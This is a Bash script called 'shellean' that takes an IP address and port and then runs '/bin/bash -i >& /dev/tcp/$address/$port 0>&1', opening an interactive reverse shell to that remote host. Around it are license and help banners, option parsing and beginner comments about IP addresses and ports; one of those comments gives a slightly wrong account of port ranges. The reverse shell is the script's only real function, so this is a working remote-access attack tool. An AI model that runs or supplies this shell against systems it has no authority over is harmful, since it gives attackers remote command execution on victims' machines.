# Copyright 2023 Elijah Gordon (NitrixXero) <nitrixxero@gmail.com>

# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

tput_bold() {
  tput bold
}

license() {
  echo '+-----------------------------------------------------------------------------------+'
  echo '|  shellean version 1.0, Copyright (C) 2023 Elijah Gordon (NitrixXero)              |'
  echo '|  shellean comes with ABSOLUTELY NO WARRANTY; for details                          |'
  echo '|  type show w. This is free software, and you are welcome                          |'
  echo '|  to redistribute it under certain conditions; type show c                         |'
  echo '|  for details.                                                                     |'
  echo '+-----------------------------------------------------------------------------------+'
}

help() {
  echo '-> usage: /bin/bash shellean.sh [--protocol <protocol> --address <internet protocol address> --port <destination port>]'
  echo '-> options:'
  echo ''
  echo '-l, --license  -> Print the GPL license and exit.'
  echo '-h, --help     -> Print help and exit.'
  echo '-V, --version  -> Print the Software Version and exit.'
  echo '-a, --address  -> Specify the Internet Protocol Address to Connect to.'
  echo '-p, --port     -> Specify the Port to Connect to.'
}

version() {
  echo -e '\e[5m'
  echo '--------------------------------------------------------------------------'
  echo '-- Written by NitrixXero at (2023), Version: (1.0)                      --'
  echo '-- Contact me on Telegram: https://t.me/nitrixxero                      --'
  echo '--------------------------------------------------------------------------'
}

process_options() {
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -l|--license) license; exit ;;
      -h|--help) help; exit ;;
      -V|--version) version; exit ;;
      -a|--address) address="$2"; shift ;;
      -p|--port) port="$2"; shift ;;
      *) ;;
    esac
    shift
  done
}

check_address_and_port() {
  if [ -z "$address" ]; then
    printf '%s\n' '[!] -> You need to specify an internet protocol address' ''
    help
    exit 1
  fi
  
  # Much like every house has a unique address for sending mail directly to it, every computer on the internet has its own unique address to communicate with it called an IP address. 
  # An IP address looks like the following 107.22.10.119, 4 sets of digits ranging from 0 - 255 separated by a period.

  if [ -z "$port" ]; then
    printf '%s\n' '[!] -> You need to specify a destination port' ''
    help
    exit 1
  fi
}

  # Perhaps aptly titled by their name, ports are an essential point in which data can be exchanged. 
  # Think of a harbour and port. 
  # Ships wishing to dock at the harbour will have to go to a port compatible with the dimensions and the facilities located on the ship.
  # When the ship lines up, it will connect to a port at the harbour. 
  # Take, for instance, that a cruise liner cannot dock at a port made for a fishing vessel and vice versa.
  # These ports enforce what can park and where — if it isn't compatible, it cannot park here.
  # Networking devices also use ports to enforce strict rules when communicating with one another.
  # When a connection has been established, any data sent or received by a device will be sent through these ports. 
  # In computing, ports are a numerical value between 0 and 65535 (65,535).
  # Because ports can range from anywhere between 0-65535, there quickly runs the risk of losing track of what aplication is using what port. 
  # A busy harbour is chaos! Thankfully, we associate applications, software and behaviours with a standard set of rules. 
  # For example, by enforcing that any web browser data is sent over port 80, software developers can design a web browser such as Google Chrome or Firefox to interpret the data the same way as one another.
  # This means that all web browsers now share one common rule: data is sent over port 80.   
  # How the browsers look, feel and easy to use is up to the designer or the user's decision.
  # While the standard rule for web data is port 80, a few other protocols have been allocated a standard rule. 
  # Any port that is within 0 and 1024 (1,024) is known as a common port.
	
print_start_message() {
  printf '%s\n' '--------------------------------------------------------------------------'
  printf '[i] Starting shellean at: %s\n' "$(date)"
  printf '%s\n' '--------------------------------------------------------------------------'
}

print_connection_info() {
  printf '[i] Connecting to: %s:%s\n' "$address" "$port"
}

print_exit_message() {
  printf '%s\n' '--------------------------------------------------------------------------'
  printf '[i] Exiting shellean at: %s\n' "$(date)"
  printf '%s\n' '--------------------------------------------------------------------------'
}

main() {
  tput_bold
  process_options "$@"
  check_address_and_port
  print_start_message
  print_connection_info

  /bin/bash -i >& "/dev/tcp/$address/$port" 0>&1

  print_exit_message
}

main "$@"
